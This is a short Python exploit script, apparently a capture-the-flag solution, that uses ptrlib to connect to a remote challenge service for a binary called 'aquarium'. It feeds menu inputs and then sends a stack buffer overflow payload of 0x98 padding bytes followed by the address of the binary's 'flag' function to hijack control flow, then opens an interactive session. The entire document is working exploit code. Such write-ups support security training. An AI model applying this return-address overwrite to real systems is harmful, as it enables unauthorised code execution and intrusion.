from ptrlib import *

elf = ELF("./aquarium")
#sock = Process(["stdbuf", "-o0", "./aquarium"])
sock = Socket("shell.actf.co", 19305)

_ = input()

print(hex(elf.symbol("flag")))
payload = b"A" * 0x98
payload += p64(elf.symbol("flag"))

# Stage 1
sock.sendline("1")
sock.sendline("2")
sock.sendline("3")
sock.sendline("4")
sock.sendline("5")
sock.sendline("6")
sock.recvuntil("Enter the name of your fish tank: ")
sock.sendline(payload)

sock.interactive()
